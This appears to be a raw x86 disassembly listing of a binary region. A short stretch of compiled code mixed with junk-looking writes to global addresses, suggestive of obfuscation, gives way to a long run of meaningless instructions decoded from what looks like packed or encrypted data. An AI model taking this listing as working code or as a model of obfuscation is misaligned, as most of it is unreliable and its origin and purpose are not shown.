  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0xf53929ff,eax
  408b09:	xchg   edx,eax
  408b0a:	jns    0x408af6
  408b0c:	in     eax,0x7b
  408b0e:	jnp    0x408b23
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	dec    edi
  408b14:	dec    edi
  408b15:	fnstsw WORD PTR [ebx+0x69cef571]
  408b1b:	test   eax,0x59f1debc
  408b20:	les    esi,FWORD PTR [esp+edx*2+0x79460d1c]
  408b27:	into   
  408b28:	xor    BYTE PTR [edi],dh
  408b2a:	and    al,dl
  408b2c:	jl     0x408afd
  408b2e:	std    
  408b2f:	dec    ebp
  408b30:	xlat   BYTE PTR ds:[ebx]
  408b31:	mov    ds:0x91ae85b1,eax
  408b36:	loope  0x408b48
  408b38:	(bad)  
  408b39:	call   0xbd1c8cbc
  408b3e:	cmp    BYTE PTR [ebx+0x14],ah
  408b41:	jge    0x408bb8
  408b43:	out    0x17,al
  408b45:	dec    edx
  408b46:	adc    BYTE PTR [edi-0x4f4871a8],ch
  408b4c:	in     eax,dx
  408b4d:	sbb    esi,esi
  408b4f:	sub    eax,0x70f619a6
  408b54:	jmp    0x408b92
  408b56:	jb     0x408b73
  408b58:	mov    DWORD PTR ds:0xa34b6c8d,esi
  408b5e:	sbb    edx,DWORD PTR [edi]
  408b60:	mov    ebp,0xbb332869
  408b65:	or     BYTE PTR [edx-0x3024e5cd],al
  408b6b:	(bad)  
  408b6d:	inc    eax
  408b6e:	sub    DWORD PTR [ebx-0x76b70b37],edi
  408b74:	inc    esp
  408b75:	push   cs
  408b76:	sub    DWORD PTR [esi],edi
  408b78:	sub    eax,0xd7cc038d
  408b7d:	or     ecx,DWORD PTR [esi]
  408b7f:	in     eax,0x57
  408b81:	sub    al,0x5c
  408b83:	adc    eax,0x83dfac7e
  408b88:	mov    ebx,0x2d52d02
  408b8d:	popf   
  408b8e:	dec    ecx
  408b8f:	call   0x1ae9:0x113e6884
  408b96:	jo     0x408bf9
  408b98:	ror    DWORD PTR [ebx-0x5a],1
  408b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9c:	and    cl,bl
  408b9e:	out    0xac,eax
  408ba0:	xor    DWORD PTR [edx+0x4c],ecx
  408ba3:	jae    0x408b75
  408ba5:	(bad)  
  408ba6:	out    dx,al
  408ba7:	xchg   esi,eax
  408ba8:	xor    edi,ecx
  408baa:	pop    ss
  408bab:	mov    edi,0xafba7482
  408bb0:	hlt    
  408bb1:	push   edx
  408bb2:	mov    bl,0x7b
  408bb4:	push   esp
  408bb5:	ret    
  408bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bb7:	mov    ch,0x79
  408bb9:	ja     0x408bde
  408bbb:	dec    esi
  408bbc:	test   BYTE PTR [edi],dl
  408bbe:	scas   al,BYTE PTR es:[edi]
  408bbf:	leave  
  408bc0:	adc    dh,dl
  408bc2:	stc    
  408bc3:	retf   
  408bc4:	inc    edx
  408bc5:	adc    DWORD PTR [ebx],esp
  408bc7:	inc    eax
  408bc8:	outs   dx,DWORD PTR ds:[esi]
  408bc9:	adc    dh,BYTE PTR [ebx+0x6c66a604]
  408bcf:	push   cs
  408bd0:	xor    cl,0x1
  408bd3:	mov    BYTE PTR [eax],ah
  408bd5:	popa   
  408bd6:	dec    esi
  408bd7:	inc    edi
  408bd8:	test   DWORD PTR [ebp+edi*4-0x7d],edx
  408bdc:	jmp    0xe94e:0x1f4ce35c
  408be3:	ins    BYTE PTR es:[edi],dx
  408be4:	and    ebx,esp
  408be6:	bound  ebp,QWORD PTR [edi-0x53]
  408be9:	push   esp
  408bea:	fdiv   DWORD PTR [ebp+esi*8+0x1d8821ce]
  408bf1:	jl     0x408baf
  408bf3:	mov    edi,0x46aebec8
  408bf8:	icebp  
  408bf9:	in     al,dx
  408bfa:	outs   dx,DWORD PTR ds:[esi]
  408bfb:	imul   edi,DWORD PTR [esi-0x49c32adb],0x1d9f36a8
  408c05:	imul   ebp,DWORD PTR [ebx+esi*8+0x2acf0071],0x4a86ac7
  408c10:	or     al,0x85
  408c12:	je     0x408c35
  408c14:	cmp    dh,BYTE PTR [ebp-0x51f7a27]
  408c1a:	jg     0x408c63
  408c1c:	and    DWORD PTR [eax],eax
  408c1e:	fwait
  408c1f:	mov    BYTE PTR [ecx-0x797daffa],cl
  408c25:	enter  0xb0c1,0x6c
  408c29:	mov    WORD PTR [esi+0x3d6c490e],es
  408c2f:	(bad)  
  408c30:	in     eax,dx
  408c31:	ret    
  408c32:	and    al,BYTE PTR [eax+0x51]
  408c35:	mov    al,ds:0x2f6a5a7f
  408c3a:	into   
  408c3b:	push   edi
  408c3c:	imul   esp,DWORD PTR [ebp-0xeea57bb],0x73
  408c43:	scas   eax,DWORD PTR es:[edi]
  408c44:	loop   0x408ca3
  408c46:	arpl   WORD PTR [esi],di
  408c48:	stos   DWORD PTR es:[edi],eax
  408c49:	or     eax,0xde7a12b3
  408c4e:	test   WORD PTR [esi+0x23],si
  408c52:	frstor [edx+ecx*1-0x51]
  408c56:	add    al,0x94
  408c58:	add    ebp,ebx
  408c5a:	sbb    al,0xc7
  408c5c:	test   BYTE PTR [ecx+0x24dd48b0],ch
  408c62:	sti    
  408c63:	in     al,0x84
  408c65:	or     eax,DWORD PTR [ecx+0x5838e1c9]
  408c6b:	fldenv [ebx]
  408c6d:	add    eax,0x34e040f8
  408c72:	push   eax
  408c74:	pop    ebx
  408c75:	mov    edi,0xd9c7e7f7
  408c7a:	ror    ch,cl
  408c7c:	(bad)  
  408c7e:	stos   DWORD PTR es:[edi],eax
  408c7f:	push   ecx
  408c80:	enter  0xd01b,0xf6
  408c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c85:	hlt    
  408c86:	ror    dl,cl
  408c88:	or     DWORD PTR [edi+0x27],esi
  408c8b:	popa   
  408c8c:	fwait
  408c8d:	inc    edi
  408c8e:	adc    bh,BYTE PTR [edi]
  408c90:	(bad)  
  408c91:	jge    0x408c14
  408c93:	dec    ebx
  408c94:	cmp    eax,0x5a998126
  408c99:	hlt    
  408c9a:	das    
  408c9b:	xchg   BYTE PTR [ebp+0x11],al
  408c9e:	stos   DWORD PTR es:[edi],eax
  408c9f:	pop    ecx
  408ca0:	retf   
  408ca1:	add    DWORD PTR [eax-0x3bcfa34d],esp
  408ca7:	xchg   esp,eax
  408ca8:	test   DWORD PTR gs:[edi+0x16],esi
  408cac:	xchg   edi,eax
  408cad:	mov    edi,0xa4c018da
  408cb2:	fbstp  TBYTE PTR [esi]
  408cb4:	add    bl,cl
  408cb6:	inc    eax
  408cb7:	pushf  
  408cb8:	(bad)  
  408cb9:	pop    edx
  408cba:	xor    BYTE PTR [ecx+0x6],cl
  408cbd:	add    al,0xe8
  408cbf:	mov    dl,0x5d
  408cc1:	(bad)  
  408cc2:	(bad)  
  408cc3:	jp     0x408cc4
  408cc5:	pop    ds
  408cc6:	ins    DWORD PTR es:[edi],dx
  408cc7:	lea    esi,[edi]
  408cc9:	mov    esi,0x1d1d1ffc
  408cce:	sub    DWORD PTR [ecx+0x5a],esp
  408cd1:	out    0x20,al
  408cd3:	into   
  408cd4:	jns    0xf0cd1bf6
  408cda:	and    al,0xd3
  408cdc:	and    ebx,DWORD PTR [esi-0x4b7cbec7]
  408ce2:	xchg   ebx,eax
  408ce3:	ds jge 0x408cfb
  408ce6:	inc    edi
  408ce7:	and    BYTE PTR [ecx],bh
  408ce9:	gs xor eax,0x442c7ee7
  408cef:	je     0x408d61
  408cf1:	loop   0x408d3f
  408cf3:	cmc    
  408cf4:	inc    ebp
  408cf5:	fbld   TBYTE PTR [edx-0x3b525c53]
  408cfb:	and    eax,0x3db14fb7
  408d00:	(bad)  [edi-0x77d7c970]
  408d06:	jecxz  0x408d34
  408d08:	cmp    al,0xe1
  408d0a:	iret   
  408d0b:	aam    0x52
  408d0d:	dec    esp
  408d0e:	ret    
  408d0f:	inc    esp
  408d10:	mov    ch,0xd0
  408d12:	(bad)  
  408d13:	jo     0x408c9d
  408d15:	not    DWORD PTR [edx]
  408d17:	push   ecx
  408d18:	jge    0x408d3e
  408d1a:	adc    BYTE PTR [ecx],dh
  408d1c:	pop    edx
  408d1d:	or     DWORD PTR [ecx],ecx
  408d1f:	pop    eax
  408d20:	cmp    esp,DWORD PTR [ebp+0x77]
  408d23:	ins    BYTE PTR es:[edi],dx
  408d24:	xchg   ecx,eax
  408d25:	add    dl,BYTE PTR ds:0x29a83063
  408d2b:	xor    BYTE PTR [esi],cl
  408d2d:	sub    al,dh
  408d2f:	or     edi,DWORD PTR [ecx+0x45]
  408d32:	pop    ecx
  408d33:	mov    esp,0xbaf85322
  408d38:	int    0x53
  408d3a:	stos   BYTE PTR es:[edi],al
  408d3b:	mov    esi,0x58171823
  408d40:	gs jl  0x408d97
  408d43:	xlat   BYTE PTR ds:[ebx]
  408d44:	inc    ebx
  408d45:	add    cl,0xf5
  408d48:	mov    eax,ds:0xfcf9a95
  408d4d:	pop    edx
  408d4e:	vorps  ymm7,ymm0,YMMWORD PTR [esi-0x2b8193bc]
  408d56:	push   esp
  408d57:	add    al,0x4c
  408d59:	fwait
  408d5a:	test   eax,0x2b9b38a9
  408d5f:	xor    bh,ch
  408d61:	pop    ss
  408d62:	dec    ebx
  408d63:	jb     0x408d16
  408d65:	xor    ecx,DWORD PTR [ecx]
  408d67:	add    al,0x82
  408d69:	repz mov ebp,DWORD PTR [ebp-0x55]
  408d6d:	dec    esi
  408d6e:	test   al,0x3c
  408d70:	nop
  408d71:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408d73:	sbb    BYTE PTR [eax+0xb],0x5
  408d77:	(bad)  
  408d78:	mov    edi,0x8fbb8e34
  408d7d:	add    ebx,DWORD PTR [ebp-0x1b9a429f]
  408d83:	mov    edx,0x784f8145
  408d88:	inc    esi
  408d89:	jl     0x408dbd
  408d8b:	add    esp,edx
  408d8d:	dec    ecx
  408d8e:	imul   esp,DWORD PTR [ebx-0x18],0xf6fd6279
  408d95:	jno    0x408dcb
  408d97:	test   eax,0x4748f30c
  408d9c:	lock and eax,DWORD PTR [edx]
  408d9f:	outs   dx,DWORD PTR ds:[esi]
  408da0:	sbb    dl,BYTE PTR [edi+0x32]
  408da3:	cmp    bh,BYTE PTR [edi-0x3f]
  408da6:	hlt    
  408da7:	xchg   BYTE PTR [ebp-0x65],ah
  408daa:	mov    fs,WORD PTR [bx+si-0x20eb]
  408daf:	test   BYTE PTR [eax],0xc1
  408db2:	arpl   WORD PTR [esi+ecx*1+0x37],dx
  408db6:	lods   eax,DWORD PTR ds:[esi]
  408db7:	cdq    
  408db8:	sub    edx,DWORD PTR [ebx+eiz*2]
  408dbb:	xor    esp,DWORD PTR [eax]
  408dbd:	loopne 0x408d84
  408dbf:	fnstenv [eax+0x1d]
  408dc2:	sbb    ch,bl
  408dc4:	lods   eax,DWORD PTR ds:[esi]
  408dc5:	pusha  
  408dc6:	jl     0x408e34
  408dc8:	xchg   edx,eax
  408dc9:	jge    0x408db6
  408dcb:	dec    eax
  408dcc:	ret    0x7e3b
  408dcf:	inc    esi
  408dd0:	push   cs
  408dd1:	adc    DWORD PTR [ecx],eax
  408dd3:	aad    0xc7
  408dd5:	or     ebx,DWORD PTR [ecx+0x3a]
  408dd8:	xor    al,0xd9
  408dda:	pop    ebx
  408ddb:	sbb    DWORD PTR [esi],edi
  408ddd:	mov    edi,0x87d515b1
  408de2:	xchg   DWORD PTR [ebx-0x7a08f674],ebp
  408de8:	jmp    0xb2a7:0xa6e117b0
  408def:	clc    
  408df0:	mov    esi,0xc3a9df1d
  408df5:	enter  0xec1a,0x1e
  408df9:	clc    
  408dfa:	cdq    
  408dfb:	loopne 0x408dcf
  408dfd:	outs   dx,BYTE PTR ds:[esi]
  408dfe:	xor    cl,bh
  408e00:	mov    esp,0x2c1813aa
  408e05:	xchg   ebx,eax
  408e06:	test   DWORD PTR [ebp-0x47],ebp
  408e09:	inc    edi
  408e0a:	cmp    edi,esp
  408e0c:	inc    ebp
  408e0d:	cmp    ah,cl
  408e0f:	dec    esi
  408e10:	repz sbb eax,0xf41acaff
  408e16:	outs   dx,BYTE PTR ds:[esi]
  408e17:	cmp    bl,BYTE PTR [edx]
  408e19:	test   cl,0xc2
  408e1c:	push   esp
  408e1d:	bound  esp,QWORD PTR [ecx+ecx*1-0x4f]
  408e21:	int3   
  408e22:	inc    eax
  408e23:	lods   eax,DWORD PTR ds:[esi]
  408e24:	popa   
  408e25:	sti    
  408e26:	rcl    BYTE PTR [esi+0x546cf209],1
  408e2c:	xor    ch,0x18
  408e2f:	(bad)  
  408e30:	clc    
  408e31:	cmp    ch,BYTE PTR [edx+0x13]
  408e34:	sub    BYTE PTR [ebp-0x72d0a5a9],dh
  408e3a:	stos   DWORD PTR es:[edi],eax
  408e3b:	pop    ebx
  408e3c:	pop    edi
  408e3d:	fwait
  408e3e:	inc    ecx
  408e3f:	(bad)  
  408e40:	xchg   ebp,eax
  408e41:	push   ebp
  408e42:	in     al,dx
  408e43:	retf   
  408e44:	xor    bh,al
  408e46:	test   BYTE PTR [ecx+0x5e4680ae],bl
  408e4c:	xor    ch,ch
  408e4e:	ret    0x752e
  408e51:	dec    edx
  408e52:	sbb    ebx,DWORD PTR [ecx+0x61]
  408e55:	inc    edx
  408e56:	pusha  
  408e57:	cwde   
  408e58:	jmp    0x3e8f91d3
  408e5d:	mov    bh,0xec
  408e5f:	and    BYTE PTR [edx+0x276b4206],al
  408e65:	test   eax,0xd01e5932
  408e6a:	cmp    eax,0xd1c0df58
  408e6f:	arpl   WORD PTR [edx+0x7],si
  408e72:	iret   
  408e73:	sbb    BYTE PTR [ebp-0x14],0x5e
  408e77:	jmp    0x36c0:0x5604bc4f
  408e7e:	in     eax,dx
  408e7f:	dec    edi
  408e80:	mov    al,ds:0xb677f2bf
  408e85:	xchg   edx,eax
  408e86:	xchg   edx,eax
  408e87:	cmc    
  408e88:	mov    dl,0x48
  408e8a:	pop    edx
  408e8b:	xor    DWORD PTR [edi+ebp*4-0x57ace2e5],edi
  408e92:	icebp  
  408e93:	cmp    eax,0x66922e93
  408e98:	or     BYTE PTR [ebx+0x610517ba],al
  408e9e:	in     eax,dx
  408e9f:	and    al,0xb8
  408ea1:	fst    DWORD PTR [esi]
  408ea3:	ror    BYTE PTR [eax+0x445ea3b7],1
  408ea9:	xor    BYTE PTR [esi-0x2db7f219],0x50
  408eb0:	lods   al,BYTE PTR ds:[esi]
  408eb1:	idiv   DWORD PTR [edi+edi*1+0x5bf4d2a2]
  408eb8:	push   eax
  408eb9:	sub    al,ah
  408ebb:	test   DWORD PTR [eax+eax*8+0x5f],0x58cdf081
  408ec3:	mov    ebp,0x3152529d
  408ec8:	adc    DWORD PTR [esi-0x3ef2c9f9],0xfb40d6ef
  408ed2:	fdiv   DWORD PTR [ebx+0x458abea0]
  408ed8:	das    
  408ed9:	mov    ds:0xc8eeb510,al
  408ede:	or     esp,DWORD PTR [edx+0x2]
  408ee1:	mov    edi,0xc8f0baeb
  408ee6:	mov    ebp,0x228f91a8
  408eeb:	repnz hlt 
  408eed:	stos   BYTE PTR es:[edi],al
  408eee:	xor    bh,BYTE PTR [esi-0x535ddb86]
  408ef4:	jge    0x408eb6
  408ef6:	loop   0x408ee7
  408ef8:	fisttp QWORD PTR [ecx-0x5e316687]
  408efe:	and    edi,DWORD PTR [ecx+0x271107cf]
  408f04:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f06:	lods   al,BYTE PTR ds:[esi]
  408f07:	out    0xb7,al
  408f09:	mov    dh,bl
  408f0b:	ror    esi,0x2f
  408f0e:	les    ebx,FWORD PTR [eax]
  408f10:	xchg   ebp,eax
  408f11:	mov    ds:0x2de0eb75,eax
  408f16:	lea    eax,[esi+0x1666e271]
  408f1c:	cld    
  408f1d:	jmp    0xb79b:0x741ef961
  408f24:	mov    fs,WORD PTR [eax]
  408f26:	or     DWORD PTR [edx+0x31],0xffffff89
  408f2a:	cmp    edi,DWORD PTR [ebp-0x1d75c181]
  408f30:	retf   
  408f31:	xor    eax,0x4e0d7d3f
  408f36:	out    dx,al
  408f37:	aam    0x7a
  408f39:	dec    ebp
  408f3a:	jmp    0x408f3c
  408f3c:	rcr    BYTE PTR [eax-0x65],0x8e
  408f40:	mov    DWORD PTR [ebp+0x540a36d4],edi
  408f46:	dec    ebx
  408f47:	ds (bad) 
  408f49:	inc    edx
  408f4a:	jl     0x408ef3
  408f4c:	sbb    al,0xb2
  408f4e:	enter  0xc532,0x6
  408f52:	mov    ebp,0xe62e518b
  408f57:	das    
  408f58:	pusha  
  408f59:	cmp    DWORD PTR [ecx],edx
  408f5b:	sti    
  408f5c:	cs xchg ecx,eax
  408f5e:	hlt    
  408f5f:	push   0xf8dfdec8
  408f64:	sub    bl,BYTE PTR [ecx+ebx*2+0x3c50cf7]
  408f6b:	(bad)  
  408f6c:	iret   
  408f6d:	cs je  0x408f7c
  408f70:	faddp  st(6),st
  408f72:	or     eax,0x436c1446
  408f77:	in     al,0xf5
  408f79:	adc    edx,eax
  408f7b:	je     0x408f77
  408f7d:	clc    
  408f7e:	int3   
  408f7f:	retf   0x70a0
  408f82:	sar    DWORD PTR [ebx+0x456347ee],cl
  408f88:	add    eax,0x2d92feca
  408f8d:	push   0x6af82b94
  408f92:	jo     0x408ffc
  408f94:	pop    ecx
  408f95:	sbb    BYTE PTR [eax],al
  408f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f98:	(bad)  
  408f99:	sub    al,0xce
  408f9b:	loope  0x408f62
  408f9d:	stc    
  408f9e:	into   
  408f9f:	pop    edi
  408fa0:	jmp    0x40900b
  408fa2:	sub    al,0x76
  408fa4:	data16 int 0x9
  408fa7:	push   ecx
  408fa8:	and    al,0x37
  408faa:	or     BYTE PTR [ecx+0x2f27e582],0xb2
  408fb1:	les    ebp,FWORD PTR [ecx-0x75b9819d]
  408fb7:	icebp  
  408fb8:	fsubr  QWORD PTR [esi]
  408fba:	push   ecx
  408fbb:	mov    eax,0xa8bbe4b7
  408fc0:	(bad)  
  408fc2:	pushf  
  408fc3:	adc    bh,bh
  408fc5:	or     bh,BYTE PTR [edi+eiz*4]
  408fc8:	mov    edi,0xfc53fc82
  408fcd:	bound  edx,QWORD PTR [ecx*8+0x3433d428]
  408fd4:	jae    0x408f8a
  408fd6:	mov    bh,0x97
  408fd8:	mov    fs,edx
  408fda:	xchg   DWORD PTR [eax+0xf],edx
  408fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fde:	add    BYTE PTR [ecx+0x2bb7746b],ah
  408fe4:	cwde   
  408fe5:	xchg   esp,eax
  408fe6:	mov    al,ds:0x1bf667c6
  408feb:	nop
  408fec:	leave  
  408fed:	pop    esi
  408fee:	lea    esp,[ecx+0x14b2a8f8]
  408ff4:	outs   dx,DWORD PTR ds:[esi]
  408ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff6:	inc    ecx
  408ff7:	icebp  
  408ff8:	imul   esi,DWORD PTR [edx-0x1240dd74],0xf
  408fff:	inc    eax
  409000:	xchg   ecx,eax
  409001:	xchg   esp,eax
  409002:	call   0x22e1:0xe5f6b601
  409009:	in     eax,0x9f
  40900b:	jns    0x408f92
  40900d:	pop    esp
  40900e:	(bad)  
  40900f:	fwait
  409010:	and    edi,ecx
  409012:	fdivr  QWORD PTR [ecx-0x51]
  409015:	jge    0x40905e
  409017:	sub    eax,ecx
  409019:	xchg   edi,eax
  40901a:	(bad)  
  40901b:	aad    0xc1
  40901d:	cli    
  40901e:	out    0x16,al
  409020:	fmul   DWORD PTR [ebp-0x3e53c3cf]
  409026:	jle    0x409078
  409028:	mov    edx,0xd268c774
  40902d:	xor    eax,0x1971da74
  409032:	ret    0x609e
  409035:	or     ah,BYTE PTR [ecx+0x24]
  409038:	(bad)  
  409039:	clc    
  40903a:	fnstcw WORD PTR [edx+0x7cbac777]
  409040:	mov    bh,ch
  409042:	loopne 0x408ff5
  409044:	push   eax
  409045:	outs   dx,BYTE PTR ds:[esi]
  409046:	mov    ds:0x3808cc61,eax
  40904b:	sbb    cl,BYTE PTR [esi]
  40904d:	pop    esi
  40904e:	cdq    
  40904f:	fs pop edx
  409051:	fist   DWORD PTR [esi]
  409053:	daa    
  409054:	sbb    eax,0x2f290057
  409059:	push   esi
  40905a:	js     0x4090b7
  40905c:	dec    edi
  40905d:	inc    esi
  40905e:	jb     0x408fed
  409060:	push   0x7185f370
  409065:	and    BYTE PTR [ebx],bh
  409067:	sbb    BYTE PTR [eax],dh
  409069:	ret    0xdcaf
  40906c:	(bad)  
  40906d:	cdq    
  40906e:	dec    ebp
  409070:	sub    edx,DWORD PTR [ecx-0x49b2b0da]
  409076:	out    dx,al
  409077:	pusha  
  409078:	inc    ecx
  409079:	cwde   
  40907a:	dec    ebp
  40907b:	test   eax,0x245d0bb
  409080:	fmul   QWORD PTR [ecx-0x63]
  409083:	dec    esi
  409084:	shl    BYTE PTR [ebx],cl
  409086:	mov    ds:0x9898084a,eax
  40908b:	push   ds
  40908c:	dec    ebx
  40908d:	neg    DWORD PTR [edi]
  40908f:	adc    esi,DWORD PTR [edx+0x49]
  409092:	rol    BYTE PTR [edi-0x2b283319],cl
  409098:	xor    BYTE PTR [edx],bh
  40909a:	into   
  40909b:	jo     0x4090f9
  40909d:	rol    BYTE PTR [ebp+0x6c],cl
  4090a0:	mov    ?,WORD PTR [edi-0x69]
  4090a3:	sbb    al,0x91
  4090a5:	inc    edi
  4090a6:	fdivr  QWORD PTR [edx-0x3a]
  4090a9:	hlt    
  4090aa:	sbb    eax,DWORD PTR [ecx-0x6b]
  4090ad:	mov    ch,0x48
  4090af:	data16 out 0x25,al
  4090b2:	sub    al,0x3a
  4090b4:	mov    BYTE PTR [edi-0x1],al
  4090b7:	xchg   esi,eax
  4090b8:	xchg   ecx,eax
  4090b9:	jns    0x4090dd
  4090bb:	(bad)  
  4090bc:	std    
  4090bd:	outs   dx,BYTE PTR ds:[esi]
  4090be:	hlt    
  4090bf:	sbb    esi,DWORD PTR [ebx-0x55394b01]
  4090c5:	push   ds
  4090c6:	pop    ebp
  4090c7:	outs   dx,BYTE PTR ds:[esi]
  4090c8:	and    bh,dh
  4090ca:	adc    DWORD PTR [edx],ebx
  4090cc:	je     0x409139
  4090ce:	lods   al,BYTE PTR ds:[esi]
  4090cf:	push   ebp
  4090d0:	out    dx,eax
  4090d1:	pop    edx
  4090d2:	jecxz  0x409086
  4090d4:	cld    
  4090d5:	cmp    BYTE PTR [edi+0x25],bl
  4090d8:	aaa    
  4090d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090da:	push   ebx
  4090db:	mov    al,ds:0xb8f8a83f
  4090e0:	sar    ch,1
  4090e2:	pop    ebp
  4090e3:	inc    eax
  4090e4:	jb     0x4090aa
  4090e6:	loopne 0x40906e
  4090e8:	retf   0xe286
  4090eb:	mov    eax,0x1157902
  4090f0:	imul   ecx,DWORD PTR [edx+0x77],0x33c62e56
  4090f7:	jb     0x40908c
  4090f9:	fiadd  DWORD PTR [ebx+0x1b]
  4090fc:	lods   eax,DWORD PTR ds:[esi]
  4090fd:	mov    bl,ch
  4090ff:	xor    eax,0xd9d84484
  409104:	bnd jl 0x409158
  409107:	in     al,0xec
  409109:	fld    QWORD PTR [edi]
  40910b:	and    al,0xb7
  40910d:	icebp  
  40910e:	adc    eax,0x771febca
  409113:	sbb    bh,dl
  409115:	cmc    
  409116:	add    al,cl
  409118:	jne    0x409197
  40911a:	inc    edi
  40911b:	jnp    0x40911b
  40911d:	add    DWORD PTR [eax-0x22],edx
  409120:	adc    DWORD PTR [ecx-0x6b],ecx
  409123:	out    dx,al
  409124:	ds pop es
  409126:	jmp    0x409159
  409128:	loop   0x409183
  40912a:	jns    0x409110
  40912c:	ins    BYTE PTR es:[edi],dx
  40912d:	sbb    al,dl
  40912f:	stos   BYTE PTR es:[edi],al
  409130:	rcl    DWORD PTR ds:0x70530e99,cl
  409136:	xor    BYTE PTR [edx+edi*2+0x2f45527a],0xc6
  40913e:	xor    eax,0x8354381d
  409143:	mov    eax,ds:0x81461a58
  409148:	sbb    BYTE PTR [esp+eax*8-0x6d],ch
  40914c:	fstp   DWORD PTR [eax+0x5c]
  40914f:	push   ecx
  409150:	inc    ah
  409152:	pop    ebx
  409153:	push   ds
  409154:	and    edx,esp
  409156:	add    DWORD PTR [esi-0x233e53dd],ecx
  40915c:	retf   0xd0bf
  40915f:	add    DWORD PTR [ebx],ebx
  409161:	jmp    0x4091da
  409163:	cmp    edx,edi
  409165:	repnz mov ch,0x3
  409168:	data16 fwait
  40916a:	inc    ecx
  40916b:	jmp    0x40913e
  40916d:	add    BYTE PTR [esi-0x66],dl
  409170:	out    0xfc,eax
  409172:	jmp    0x4d30:0xb079df5a
  409179:	sub    BYTE PTR ds:0x1122f59b,ah
  40917f:	mov    ecx,0x9030c24e
  409184:	int3   
  409185:	cmp    esp,DWORD PTR [ecx+0x66]
  409188:	or     al,0xf8
  40918a:	push   edx
  40918b:	sbb    ecx,DWORD PTR [edx-0x490186f3]
  409191:	mov    al,ds:0x8ecdb454
  409196:	hlt    
  409197:	pushf  
  409198:	push   edx
  409199:	jae    0x409182
  40919b:	fiadd  WORD PTR [ebx]
  40919d:	xor    edx,DWORD PTR [esi+0x4d6c705f]
  4091a3:	stc    
  4091a4:	xor    al,0x12
  4091a6:	into   
  4091a7:	mov    bl,0x35
  4091a9:	xlat   BYTE PTR ds:[ebx]
  4091aa:	sub    al,0x68
  4091ac:	out    dx,eax
  4091ad:	mov    edi,0xb3403259
  4091b2:	fstp   TBYTE PTR [ecx-0x41de1b64]
  4091b8:	in     al,0x3d
  4091ba:	sbb    eax,0x985b6adf
  4091bf:	cmc    
  4091c0:	xchg   edx,eax
  4091c1:	push   eax
  4091c2:	mov    al,ds:0xd903f1ea
  4091c7:	(bad)  
  4091c9:	mov    esi,0xcd838051
  4091ce:	cmp    al,0x64
  4091d0:	xchg   esi,eax
  4091d1:	jo     0x4091bc
  4091d3:	sbb    eax,0x17bcbc71
  4091d8:	sbb    dh,BYTE PTR [ebx+0x2e]
  4091db:	push   ds
  4091dc:	push   0x10
  4091de:	scas   al,BYTE PTR es:[edi]
  4091df:	and    bl,bl
  4091e1:	repz (bad) 
  4091e3:	mov    dh,bl
  4091e5:	dec    ebx
  4091e6:	inc    ebx
  4091e7:	jl     0x40920e
  4091e9:	mov    ah,al
  4091eb:	push   esi
  4091ec:	jmp    esp
  4091ee:	and    BYTE PTR [edx],0xa8
  4091f1:	call   0x6588:0x9ad17d73
  4091f8:	jecxz  0x409218
  4091fa:	fwait
  4091fb:	jmp    0x4091ae
  4091fd:	(bad)  
  4091fe:	inc    eax
  4091ff:	pop    eax
  409200:	mov    ebx,0x978a9f22
  409205:	daa    
  409206:	xor    eax,0x2c127376
  40920b:	or     esi,DWORD PTR [esi+0x7966e958]
  409211:	xchg   esp,eax
  409212:	out    0xc9,eax
  409214:	stc    
  409215:	repnz in al,0x6e
  409218:	fld    DWORD PTR [edx+0x25634bfd]
  40921e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921f:	adc    al,0x59
  409221:	mov    dh,0xf2
  409223:	xchg   ebx,eax
